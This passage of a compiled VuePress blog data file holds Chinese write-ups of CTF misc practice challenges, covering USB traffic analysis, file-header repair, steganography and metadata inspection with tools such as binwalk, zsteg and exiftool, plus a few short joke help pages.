我能笑话你一年，那还能咋办,进数据库自己看</h3>\n',date:"0000-00-00",deps:[],hoistedTags:[],links:[],pathInferred:"/help.html",pathLocale:"/",permalink:null,routeMeta:{},slug:"help",filePath:"E:/vue/aurora-blog-1.13.0/aurora-blog-1.13.0/reicalg/docs/help.md",filePathRelative:"help.md",componentFilePath:"E:/vue/aurora-blog-1.13.0/aurora-blog-1.13.0/reicalg/docs/.vuepress/.temp/pages/help.html.vue",componentFilePathRelative:"pages/help.html.vue",componentFileChunkName:"v-4911275f",dataFilePath:"E:/vue/aurora-blog-1.13.0/aurora-blog-1.13.0/reicalg/docs/.vuepress/.temp/pages/help.html.js",dataFilePathRelative:"pages/help.html.js",dataFileChunkName:"v-4911275f",htmlFilePath:"E:/vue/aurora-blog-1.13.0/aurora-blog-1.13.0/reicalg/docs/.vuepress/dist/help.html",htmlFilePathRelative:"help.html"},{data:{key:"v-5133825e",path:"/sb.html",title:"服务协议？隐私政策?",lang:"zh-CN",frontmatter:{stick:!1,tag:["help"],categories:["help","歪比八卜"]},excerpt:"",headers:[{level:3,title:"这种破网站哪来隐私政策和服务协议？先笑话你一年",slug:"这种破网站哪来隐私政策和服务协议-先笑话你一年",children:[]}],git:{}},key:"v-5133825e",path:"/sb.html",title:"服务协议？隐私政策?",lang:"zh-CN",frontmatter:{stick:!1,tag:["help"],categories:["help","歪比八卜"]},excerpt:"",headers:[{level:3,title:"这种破网站哪来隐私政策和服务协议？先笑话你一年",slug:"这种破网站哪来隐私政策和服务协议-先笑话你一年",children:[]}],content:"\r\n# 服务协议？隐私政策?\r\n\r\n### 这种破网站哪来隐私政策和服务协议？先笑话你一年\r\n\r\n",contentRendered:'<h1 id="服务协议-隐私政策" tabindex="-1"><a class="header-anchor" href="#服务协议-隐私政策" aria-hidden="true">#</a> 服务协议？隐私政策?</h1>\n<h3 id="这种破网站哪来隐私政策和服务协议-先笑话你一年" tabindex="-1"><a class="header-anchor" href="#这种破网站哪来隐私政策和服务协议-先笑话你一年" aria-hidden="true">#</a> 这种破网站哪来隐私政策和服务协议？先笑话你一年</h3>\n',date:"0000-00-00",deps:[],hoistedTags:[],links:[],pathInferred:"/sb.html",pathLocale:"/",permalink:null,routeMeta:{},slug:"sb",filePath:"E:/vue/aurora-blog-1.13.0/aurora-blog-1.13.0/reicalg/docs/sb.md",filePathRelative:"sb.md",componentFilePath:"E:/vue/aurora-blog-1.13.0/aurora-blog-1.13.0/reicalg/docs/.vuepress/.temp/pages/sb.html.vue",componentFilePathRelative:"pages/sb.html.vue",componentFileChunkName:"v-5133825e",dataFilePath:"E:/vue/aurora-blog-1.13.0/aurora-blog-1.13.0/reicalg/docs/.vuepress/.temp/pages/sb.html.js",dataFilePathRelative:"pages/sb.html.js",dataFileChunkName:"v-5133825e",htmlFilePath:"E:/vue/aurora-blog-1.13.0/aurora-blog-1.13.0/reicalg/docs/.vuepress/dist/sb.html",htmlFilePathRelative:"sb.html"},{data:{key:"v-2eba71ab",path:"/xiangmusi.html",title:"项目四",lang:"zh-CN",frontmatter:{},excerpt:"",headers:[],git:{}},key:"v-2eba71ab",path:"/xiangmusi.html",title:"项目四",lang:"zh-CN",frontmatter:{},excerpt:"",headers:[],content:"# 项目四",contentRendered:'<h1 id="项目四" tabindex="-1"><a class="header-anchor" href="#项目四" aria-hidden="true">#</a> 项目四</h1>\n',date:"0000-00-00",deps:[],hoistedTags:[],links:[],pathInferred:"/xiangmusi.html",pathLocale:"/",permalink:null,routeMeta:{},slug:"xiangmusi",filePath:"E:/vue/aurora-blog-1.13.0/aurora-blog-1.13.0/reicalg/docs/xiangmusi.md",filePathRelative:"xiangmusi.md",componentFilePath:"E:/vue/aurora-blog-1.13.0/aurora-blog-1.13.0/reicalg/docs/.vuepress/.temp/pages/xiangmusi.html.vue",componentFilePathRelative:"pages/xiangmusi.html.vue",componentFileChunkName:"v-2eba71ab",dataFilePath:"E:/vue/aurora-blog-1.13.0/aurora-blog-1.13.0/reicalg/docs/.vuepress/.temp/pages/xiangmusi.html.js",dataFilePathRelative:"pages/xiangmusi.html.js",dataFileChunkName:"v-2eba71ab",htmlFilePath:"E:/vue/aurora-blog-1.13.0/aurora-blog-1.13.0/reicalg/docs/.vuepress/dist/xiangmusi.html",htmlFilePathRelative:"xiangmusi.html"},{data:{key:"v-c4be0d9c",path:"/misc/1.html",title:"misc刷题（杂七杂八）",lang:"zh-CN",frontmatter:{date:"2023/7/10 16:18",stick:!1,keyword:"misc",description:"刷题",title:"misc刷题（杂七杂八）",tag:["ctfshow刷题"],categories:["misc","歪比八卜"]},excerpt:"",headers:[{level:2,title:"[CISCN 2022 初赛]ez_usb",slug:"ciscn-2022-初赛-ez-usb",children:[]},{level:2,title:"[CISCN 2018]Picture",slug:"ciscn-2018-picture",children:[]},{level:2,title:"[CISCN 2023 初赛]被加密的生产流量",slug:"ciscn-2023-初赛-被加密的生产流量",children:[]},{level:2,title:"[CISCN 2022 初赛]everlasting_night",slug:"ciscn-2022-初赛-everlasting-night",children:[]},{level:2,title:"[CISCN 2021初赛]running_pixel",slug:"ciscn-2021初赛-running-pixel",children:[]}],git:{}},key:"v-c4be0d9c",path:"/misc/1.html",title:"misc刷题（杂七杂八）",lang:"zh-CN",frontmatter:{date:"2023/7/10 16:18",stick:!1,keyword:"misc",description:"刷题",title:"misc刷题（杂七杂八）",tag:["ctfshow刷题"],categories:["misc","歪比八卜"]},excerpt:"",headers:[{level:2,title:"[CISCN 2022 初赛]ez_usb",slug:"ciscn-2022-初赛-ez-usb",children:[]},{level:2,title:"[CISCN 2018]Picture",slug:"ciscn-2018-picture",children:[]},{level:2,title:"[CISCN 2023 初赛]被加密的生产流量",slug:"ciscn-2023-初赛-被加密的生产流量",children:[]},{level:2,title:"[CISCN 2022 初赛]everlasting_night",slug:"ciscn-2022-初赛-everlasting-night",children:[]},{level:2,title:"[CISCN 2021初赛]running_pixel",slug:"ciscn-2021初赛-running-pixel",children:[]}],content:"\r\n## [CISCN 2022 初赛]ez_usb\r\n\r\n这道题已经提示是一道usb流量分析题\r\n\r\n[USB流量取证分析](https://blog.51cto.com/u_15400016/4288275)\r\n\r\n> HID（Human Interface Device，人机接口设备）是USB设备中常用的[设备类型](https://www.usbzh.com/article/detail-273.html)，是直接与人交互的USB设备，例如键盘、鼠标与游戏杆等。在USB设备中，HID设备的成本较低。另外，HID设备并不一定要有人机交互功能，只要符合HID类别规范的设备都是HID设备。\r\n\r\n![image-20230724172358412](https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202307241723667.png)\r\n\r\nusbhid.data先筛选有hid的流量 一般来讲是键盘、鼠标、游戏杆\r\n\r\n有三组2.8.1  ，2.4.1，2.10.1\r\n\r\n分别把他们重组\r\n\r\n2.4.1的流量包中包数据长度为0 应该是一个混淆包\r\n\r\n![image-20230725083740988](https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202307250837270.png)\r\n\r\n一般usb流量隐写，要么键盘隐写，或者是鼠标隐写\r\n\r\n将其放入usb键盘鼠标流量脚本跑 此处使用的是\r\n\r\n![image-20230725084033262](https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202307250840287.png)\r\n\r\n> 2.8.1\r\n\r\n![image-20230725084009040](https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202307250840080.png)\r\n\r\n将其中的CAP和DEL删除 \r\n\r\n```\r\nJPEG文件头FFD8FFE0 00104A46,JPEG文件结尾为FFD9,rar的文件尾C43D7B00 400700,文件头52617221 1A0700即Rar!,ZIP文件头504B0304 0A00即PK,GIF开头`47494638 396即GIF,PNG文件头89504E47 0D0A1A0A 0000000D 49即|PNG,PNG文件结尾49454E44 AE426082即IEND bmp文件头424D即BM\r\n```\r\n\r\n文件头显示是rar文件，导入010editor 重新导出文件 （注意代码块十六进制需要ctrl+shift+v整段复制）\r\n\r\n> 2.10.1\r\n\r\n![](https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202307250845852.png)\r\n\r\n这个猜测是rar文件密码\r\n\r\n\r\n\r\n\r\n\r\n## [CISCN 2018]Picture\r\n\r\n拿到题目首先想着binwalk分离文件\r\n\r\n![image-20230725100342848](https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202307251003939.png)\r\n\r\n分离以后文件发现文件有base64编码可能\r\n\r\n![image-20230725100758799](https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202307251007833.png)\r\n\r\n这边我先解了一遍\r\n\r\n![image-20230725101417193](https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202307251014228.png)\r\n\r\nkp开头中间也有pk 考点是文件头混肴，但是这个没法直接换成十六进制\r\n\r\n可以使用在线工具[Base64 在线编码解码 ](https://base64.us/)\r\n\r\n直接换成十六进制导入010editor然后修改文件头导出zip文件\r\n\r\n![image-20230725102139482](https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202307251021568.png)\r\n\r\n注释中<- password啊是提示 然后根据前面的报错提示可以得到密码： integer division or modulo by zero\r\n\r\n![image-20230725102327781](https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202307251023848.png)\r\n\r\n解压文件得到俩文件 一个假flag 另一个文件是编码\r\n\r\n![image-20230725102808612](https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202307251028642.png)\r\n\r\n直接扔工具里面去跑了\r\n\r\n![image-20230725102923662](https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202307251029722.png)\r\n\r\n是uuencode编码\r\n\r\n## [CISCN 2023 初赛]被加密的生产流量\r\n\r\n\r\n\r\n流量包的名字就是modbus 猜测与modbus有关 追踪tcp流 看隐写的内容\r\n\r\n![image-20230725111431413](https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202307251114676.png)\r\n\r\n有等号是base编码 可以使用pyshark脚本跑切割，或者就是手动一个一个写下来这个\r\n\r\n放进解码器跑就行了\r\n\r\n![image-20230725141828416](https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202307251418825.png)\r\n\r\n## [CISCN 2022 初赛]everlasting_night\r\n\r\n一道lsb隐写题\r\n\r\n首先打开010editor 查看这张png图片的hex 文件头和文件尾是全的 文件尾之后还有一串十六进制\r\n\r\n![image-20230728110233535](https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202307281102581.png)\r\n\r\n32位 ？？？  md5 解密\r\n\r\n![image-20230728110753829](https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202307281107876.png)\r\n\r\nohhWh04m1 不知道是什么东西 先留着再说\r\n\r\nstegsolve 打开图片 发现在alpha 通道2里面发现一点不对 \r\n\r\n![image-20230728111136364](https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202307281111490.png)\r\n\r\n用data extract 打开alpha通道通道2  以列\r\n\r\n![image-20230728111757955](https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202307281117018.png)  \r\n\r\n是有一串字符串的 还是不知道要用来干什么 \r\n\r\n学lsb隐写  那就跑脚本了 上面的字符串是lsb隐写的密码 \r\n\r\n![image-20230728112352233](https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202307281123269.png)\r\n\r\n先导了一份文本文件，pk文件头 导一份zip出来\r\n\r\n![image-20230728112306789](https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202307281123857.png)\r\n\r\nzip解压缩有密码，拿第一个密码解压 出了一个flag文件 看格式应该是png 但是文件损坏\r\n\r\n看wp 需要用gimp打开 并且需要改一下后缀名为data\r\n\r\n`gimp flag.data`\r\n\r\n改一点宽度 就出来了\r\n\r\n![image-20230728112729732](https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202307281127822.png)\r\n\r\n## [CISCN 2021初赛]running_pixel",contentRendered:'<h2 id="ciscn-2022-初赛-ez-usb" tabindex="-1"><a class="header-anchor" href="#ciscn-2022-初赛-ez-usb" aria-hidden="true">#</a> [CISCN 2022 初赛]ez_usb</h2>\n<p>这道题已经提示是一道usb流量分析题</p>\n<p><a href="https://blog.51cto.com/u_15400016/4288275" target="_blank" rel="noopener noreferrer">USB流量取证分析<ExternalLinkIcon/></a></p>\n<blockquote>\n<p>HID（Human Interface Device，人机接口设备）是USB设备中常用的<a href="https://www.usbzh.com/article/detail-273.html" target="_blank" rel="noopener noreferrer">设备类型<ExternalLinkIcon/></a>，是直接与人交互的USB设备，例如键盘、鼠标与游戏杆等。在USB设备中，HID设备的成本较低。另外，HID设备并不一定要有人机交互功能，只要符合HID类别规范的设备都是HID设备。</p>\n</blockquote>\n<p><img src="https://ooszy.cco.vin/img/blog-public/ljz.gif" alt="image-20230724172358412" originSrc="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202307241723667.png" data="aurora"></p>\n<p>usbhid.data先筛选有hid的流量 一般来讲是键盘、鼠标、游戏杆</p>\n<p>有三组2.8.1  ，2.4.1，2.10.1</p>\n<p>分别把他们重组</p>\n<p>2.4.1的流量包中包数据长度为0 应该是一个混淆包</p>\n<p><img src="https://ooszy.cco.vin/img/blog-public/ljz.gif" alt="image-20230725083740988" originSrc="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202307250837270.png" data="aurora"></p>\n<p>一般usb流量隐写，要么键盘隐写，或者是鼠标隐写</p>\n<p>将其放入usb键盘鼠标流量脚本跑 此处使用的是</p>\n<p><img src="https://ooszy.cco.vin/img/blog-public/ljz.gif" alt="image-20230725084033262" originSrc="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202307250840287.png" data="aurora"></p>\n<blockquote>\n<p>2.8.1</p>\n</blockquote>\n<p><img src="https://ooszy.cco.vin/img/blog-public/ljz.gif" alt="image-20230725084009040" originSrc="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202307250840080.png" data="aurora"></p>\n<p>将其中的CAP和DEL删除</p>\n<div class="language-text ext-text line-numbers-mode"><pre v-pre class="language-text"><code>JPEG文件头FFD8FFE0 00104A46,JPEG文件结尾为FFD9,rar的文件尾C43D7B00 400700,文件头52617221 1A0700即Rar!,ZIP文件头504B0304 0A00即PK,GIF开头`47494638 396即GIF,PNG文件头89504E47 0D0A1A0A 0000000D 49即|PNG,PNG文件结尾49454E44 AE426082即IEND bmp文件头424D即BM\n</code></pre><div class="line-numbers"><span class="line-number">1</span><br></div></div><p>文件头显示是rar文件，导入010editor 重新导出文件 （注意代码块十六进制需要ctrl+shift+v整段复制）</p>\n<blockquote>\n<p>2.10.1</p>\n</blockquote>\n<p><img src="https://ooszy.cco.vin/img/blog-public/ljz.gif" alt="" originSrc="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202307250845852.png" data="aurora"></p>\n<p>这个猜测是rar文件密码</p>\n<h2 id="ciscn-2018-picture" tabindex="-1"><a class="header-anchor" href="#ciscn-2018-picture" aria-hidden="true">#</a> [CISCN 2018]Picture</h2>\n<p>拿到题目首先想着binwalk分离文件</p>\n<p><img src="https://ooszy.cco.vin/img/blog-public/ljz.gif" alt="image-20230725100342848" originSrc="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202307251003939.png" data="aurora"></p>\n<p>分离以后文件发现文件有base64编码可能</p>\n<p><img src="https://ooszy.cco.vin/img/blog-public/ljz.gif" alt="image-20230725100758799" originSrc="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202307251007833.png" data="aurora"></p>\n<p>这边我先解了一遍</p>\n<p><img src="https://ooszy.cco.vin/img/blog-public/ljz.gif" alt="image-20230725101417193" originSrc="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202307251014228.png" data="aurora"></p>\n<p>kp开头中间也有pk 考点是文件头混肴，但是这个没法直接换成十六进制</p>\n<p>可以使用在线工具<a href="https://base64.us/" target="_blank" rel="noopener noreferrer">Base64 在线编码解码 <ExternalLinkIcon/></a></p>\n<p>直接换成十六进制导入010editor然后修改文件头导出zip文件</p>\n<p><img src="https://ooszy.cco.vin/img/blog-public/ljz.gif" alt="image-20230725102139482" originSrc="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202307251021568.png" data="aurora"></p>\n<p>注释中&lt;- password啊是提示 然后根据前面的报错提示可以得到密码： integer division or modulo by zero</p>\n<p><img src="https://ooszy.cco.vin/img/blog-public/ljz.gif" alt="image-20230725102327781" originSrc="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202307251023848.png" data="aurora"></p>\n<p>解压文件得到俩文件 一个假flag 另一个文件是编码</p>\n<p><img src="https://ooszy.cco.vin/img/blog-public/ljz.gif" alt="image-20230725102808612" originSrc="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202307251028642.png" data="aurora"></p>\n<p>直接扔工具里面去跑了</p>\n<p><img src="https://ooszy.cco.vin/img/blog-public/ljz.gif" alt="image-20230725102923662" originSrc="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202307251029722.png" data="aurora"></p>\n<p>是uuencode编码</p>\n<h2 id="ciscn-2023-初赛-被加密的生产流量" tabindex="-1"><a class="header-anchor" href="#ciscn-2023-初赛-被加密的生产流量" aria-hidden="true">#</a> [CISCN 2023 初赛]被加密的生产流量</h2>\n<p>流量包的名字就是modbus 猜测与modbus有关 追踪tcp流 看隐写的内容</p>\n<p><img src="https://ooszy.cco.vin/img/blog-public/ljz.gif" alt="image-20230725111431413" originSrc="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202307251114676.png" data="aurora"></p>\n<p>有等号是base编码 可以使用pyshark脚本跑切割，或者就是手动一个一个写下来这个</p>\n<p>放进解码器跑就行了</p>\n<p><img src="https://ooszy.cco.vin/img/blog-public/ljz.gif" alt="image-20230725141828416" originSrc="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202307251418825.png" data="aurora"></p>\n<h2 id="ciscn-2022-初赛-everlasting-night" tabindex="-1"><a class="header-anchor" href="#ciscn-2022-初赛-everlasting-night" aria-hidden="true">#</a> [CISCN 2022 初赛]everlasting_night</h2>\n<p>一道lsb隐写题</p>\n<p>首先打开010editor 查看这张png图片的hex 文件头和文件尾是全的 文件尾之后还有一串十六进制</p>\n<p><img src="https://ooszy.cco.vin/img/blog-public/ljz.gif" alt="image-20230728110233535" originSrc="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202307281102581.png" data="aurora"></p>\n<p>32位 ？？？  md5 解密</p>\n<p><img src="https://ooszy.cco.vin/img/blog-public/ljz.gif" alt="image-20230728110753829" originSrc="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202307281107876.png" data="aurora"></p>\n<p>ohhWh04m1 不知道是什么东西 先留着再说</p>\n<p>stegsolve 打开图片 发现在alpha 通道2里面发现一点不对</p>\n<p><img src="https://ooszy.cco.vin/img/blog-public/ljz.gif" alt="image-20230728111136364" originSrc="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202307281111490.png" data="aurora"></p>\n<p>用data extract 打开alpha通道通道2  以列</p>\n<p><img src="https://ooszy.cco.vin/img/blog-public/ljz.gif" alt="image-20230728111757955" originSrc="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202307281117018.png" data="aurora"></p>\n<p>是有一串字符串的 还是不知道要用来干什么</p>\n<p>学lsb隐写  那就跑脚本了 上面的字符串是lsb隐写的密码</p>\n<p><img src="https://ooszy.cco.vin/img/blog-public/ljz.gif" alt="image-20230728112352233" originSrc="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202307281123269.png" data="aurora"></p>\n<p>先导了一份文本文件，pk文件头 导一份zip出来</p>\n<p><img src="https://ooszy.cco.vin/img/blog-public/ljz.gif" alt="image-20230728112306789" originSrc="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202307281123857.png" data="aurora"></p>\n<p>zip解压缩有密码，拿第一个密码解压 出了一个flag文件 看格式应该是png 但是文件损坏</p>\n<p>看wp 需要用gimp打开 并且需要改一下后缀名为data</p>\n<p><code>gimp flag.data</code></p>\n<p>改一点宽度 就出来了</p>\n<p><img src="https://ooszy.cco.vin/img/blog-public/ljz.gif" alt="image-20230728112729732" originSrc="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202307281127822.png" data="aurora"></p>\n<h2 id="ciscn-2021初赛-running-pixel" tabindex="-1"><a class="header-anchor" href="#ciscn-2021初赛-running-pixel" aria-hidden="true">#</a> [CISCN 2021初赛]running_pixel</h2>\n',date:"0000-00-00",deps:[],hoistedTags:[],links:[],pathInferred:"/misc/1.html",pathLocale:"/",permalink:null,routeMeta:{},slug:"1",filePath:"E:/vue/aurora-blog-1.13.0/aurora-blog-1.13.0/reicalg/docs/misc/1.md",filePathRelative:"misc/1.md",componentFilePath:"E:/vue/aurora-blog-1.13.0/aurora-blog-1.13.0/reicalg/docs/.vuepress/.temp/pages/misc/1.html.vue",componentFilePathRelative:"pages/misc/1.html.vue",componentFileChunkName:"v-c4be0d9c",dataFilePath:"E:/vue/aurora-blog-1.13.0/aurora-blog-1.13.0/reicalg/docs/.vuepress/.temp/pages/misc/1.html.js",dataFilePathRelative:"pages/misc/1.html.js",dataFileChunkName:"v-c4be0d9c",htmlFilePath:"E:/vue/aurora-blog-1.13.0/aurora-blog-1.13.0/reicalg/docs/.vuepress/dist/misc/1.html",htmlFilePathRelative:"misc/1.html"},{data:{key:"v-7c00b81e",path:"/misc/misc1.html",title:"misc刷题（信息附加）",lang:"zh-CN",frontmatter:{date:"2023/5/26 16:18",stick:!1,keyword:"misc,ctfshow",description:"刷题",title:"misc刷题（信息附加）",tag:["ctfshow刷题"],categories:["信息附加","歪比八卜"]},excerpt:"",headers:[{level:2,title:"信息附加",slug:"信息附加",children:[{level:3,title:"Misc3",slug:"misc3",children:[]},{level:3,title:"misc5",slug:"misc5",children:[]},{level:3,title:"misc6",slug:"misc6",children:[]},{level:3,title:"misc7",slug:"misc7",children:[]},{level:3,title:"misc8",slug:"misc8",children:[]},{level:3,title:"misc9",slug:"misc9",children:[]},{level:3,title:"misc10",slug:"misc10",children:[]},{level:3,title:"misc11",slug:"misc11",children:[]},{level:3,title:"misc12",slug:"misc12",children:[]},{level:3,title:"misc13",slug:"misc13",children:[]},{level:3,title:"misc14",slug:"misc14",children:[]},{level:3,title:"misc15",slug:"misc15",children:[]},{level:3,title:"misc16",slug:"misc16",children:[]},{level:3,title:"misc17",slug:"misc17",children:[]},{level:3,title:"misc18",slug:"misc18",children:[]},{level:3,title:"misc19",slug:"misc19",children:[]},{level:3,title:"misc20",slug:"misc20",children:[]},{level:3,title:"misc21",slug:"misc21",children:[]},{level:3,title:"misc22",slug:"misc22",children:[]},{level:3,title:"misc23",slug:"misc23",children:[]}]},{level:2,title:"信息附加的总结：",slug:"信息附加的总结",children:[]}],git:{}},key:"v-7c00b81e",path:"/misc/misc1.html",title:"misc刷题（信息附加）",lang:"zh-CN",frontmatter:{date:"2023/5/26 16:18",stick:!1,keyword:"misc,ctfshow",description:"刷题",title:"misc刷题（信息附加）",tag:["ctfshow刷题"],categories:["信息附加","歪比八卜"]},excerpt:"",headers:[{level:2,title:"信息附加",slug:"信息附加",children:[{level:3,title:"Misc3",slug:"misc3",children:[]},{level:3,title:"misc5",slug:"misc5",children:[]},{level:3,title:"misc6",slug:"misc6",children:[]},{level:3,title:"misc7",slug:"misc7",children:[]},{level:3,title:"misc8",slug:"misc8",children:[]},{level:3,title:"misc9",slug:"misc9",children:[]},{level:3,title:"misc10",slug:"misc10",children:[]},{level:3,title:"misc11",slug:"misc11",children:[]},{level:3,title:"misc12",slug:"misc12",children:[]},{level:3,title:"misc13",slug:"misc13",children:[]},{level:3,title:"misc14",slug:"misc14",children:[]},{level:3,title:"misc15",slug:"misc15",children:[]},{level:3,title:"misc16",slug:"misc16",children:[]},{level:3,title:"misc17",slug:"misc17",children:[]},{level:3,title:"misc18",slug:"misc18",children:[]},{level:3,title:"misc19",slug:"misc19",children:[]},{level:3,title:"misc20",slug:"misc20",children:[]},{level:3,title:"misc21",slug:"misc21",children:[]},{level:3,title:"misc22",slug:"misc22",children:[]},{level:3,title:"misc23",slug:"misc23",children:[]}]},{level:2,title:"信息附加的总结：",slug:"信息附加的总结",children:[]}],content:'\r\n# misc刷题（信息附加）\r\n\r\n##  信息附加\r\n\r\n### Misc3\r\n\r\n> Bpgview.exe 的使用 当文件后缀是bpg使用\r\n\r\n> <img src="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202305251822927.png" style="zoom:50%;" />\r\n\r\n### misc5\r\n\r\n> 图片隐写\r\n>\r\n> ![](https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202305251825792.png)\r\n\r\n### misc6\r\n\r\n同理\r\n\r\n![](https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202305251825010.png)\r\n\r\n### misc7\r\n\r\n> 同理 不放照片了\r\n\r\n### misc8\r\n\r\n ![](https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202305251825199.png)\r\n\r\n> 使用foremost分离图片\r\n\r\n> 方法[foremost使用简介](https://blog.csdn.net/john_david_/article/details/87273152)\r\n\r\n### misc9\r\n\r\n> 用winhex查找\r\n\r\n### misc10\r\n\r\n> 图片文件的分离\r\n\r\n ![](https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202305251826495.png)![](https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202305251826104.png)\r\n\r\n \r\n\r\n> 根据提示搞 要将runas=root\r\n\r\n### misc11\r\n\r\n ![image-20230525182748221](https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202305251827268.png)\r\n\r\n> 利用tweakpng 对png文件idat（数据）对图片内容改写\r\n\r\n ![image-20230525182805387](https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202305251828423.png)\r\n\r\n> 删除不同的数据块所获得的内容也不同\r\n\r\n### misc12 \r\n\r\n![image-20230525182820884](https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202305251828925.png)\r\n\r\n> 按f7预览\r\n\r\n> 从头逐个删除idat直至出现\r\n\r\n> 具体原因不清楚   idat的length应该是一样的 常规删除不一样的\r\n\r\n### misc13\r\n\r\n> 抽象的题目\r\n\r\n> 图片用winhex打开图片 发现有类似flag的东西？\r\n\r\n>   然后分析一个间隔一个的出现\r\n>\r\n> ![image-20230525182858447](https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202305251828483.png)\r\n\r\n> 那么将十六进制转化为byte类型再用切片提取flag\r\n\r\n![image-20230525182939765](https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202305251829795.png) \r\n\r\n \r\n\r\n### misc14\r\n\r\n ![image-20230525182953629](https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202305251829665.png)\r\n\r\n> Binwalk查看整个文件的块内容\r\n\r\n> 可以发现发现 有四个文件块 \r\n\r\n> 用dd命令进行分解 dd if=源文件 of=输出文件 skip=跳过的大小 count=提取文件的大小 bs=块大小 这边DECIMAL 是指的上一个文件的大小\r\n\r\n> 应该先查看文件的类型然后 对对应的文件进行分离\r\n\r\n \r\n\r\n### misc15\r\n\r\n> 用winhex查找\r\n\r\n 无图.jpg\r\n\r\n### misc16 \r\n\r\n> 用binwalk进行分离 得到文件夹下里面寻找\r\n\r\n 再次无图.jpg\r\n\r\n### misc17\r\n\r\n> 新工具的使用 zsteg 此工具可以对png 和bmp文件中隐写的数据进行分离 \r\n\r\n> [zsteg使用方法](https://blog.csdn.net/weixin_52941926/article/details/121536324)\r\n\r\n> 建议以后如果不会好好看\r\n\r\n> 可以先使用zsteg <文件名> --all 查看所有组合\r\n\r\n ![image-20230526161238348](https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202305261612400.png)\r\n\r\n> 这边发现是只有extradata:0模式下有隐藏内容\r\n\r\n> 所以对此进行分离\r\n\r\n ![image-20230526161256254](https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202305261612289.png)\r\n\r\n> 然后打开发现是乱码 然后就查答案 发现可以binwalk再次进行分离\r\n\r\n ![image-20230526161300816](https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202305261613849.png)\r\n\r\n> 然后就分离出来了 \r\n\r\n \r\n\r\n### misc18\r\n\r\n> 藏在详细信息里\r\n\r\n![image-20230529165153643](C:/Users/23167/AppData/Roaming/Typora/typora-user-images/image-20230529165153643.png) \r\n\r\n> 就没啥好说的，多留意就行\r\n\r\n### misc19\r\n\r\n> 使用新工具exiftool查看图片的详细内容 \r\n\r\n![image-20230529165312013](https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202305291653062.png)\r\n\r\n> 使用exiftool能看到一些隐藏的参数，所以这道隐写题 将flag放于document name 和host nname中\r\n\r\n![image-20230529165521755](https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202305291655788.png)\r\n\r\n> 那么同理 18题的也可以用这个工具查看\r\n\r\n![image-20230529165534249](https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202305291655301.png) \r\n\r\n### misc20\r\n\r\n> 还是用exiftool查看文件信息\r\n\r\n> 发现在comment里有文字隐写\r\n\r\n![image-20230529165555621](https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202305291655652.png)\r\n\r\n### misc21![image-20230529165632408](https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202305291656458.png)\r\n\r\n> 题目给出的提示是要在序号里找\r\n\r\n> 但是唯一一个serial number很显然不符合flag格式\r\n\r\n> 这时发现有四段xy信息是一串长度相同的数字\r\n\r\n> 第一个想法就是连起来然后去拿十六进制，但是不对，后来尝试一段一段转化就得到了\r\n>\r\n> ![image-20230529165900646](https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202305291659679.png)\r\n>\r\n> ![image-20230529165926034](https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202305291659067.png)\r\n\r\n### 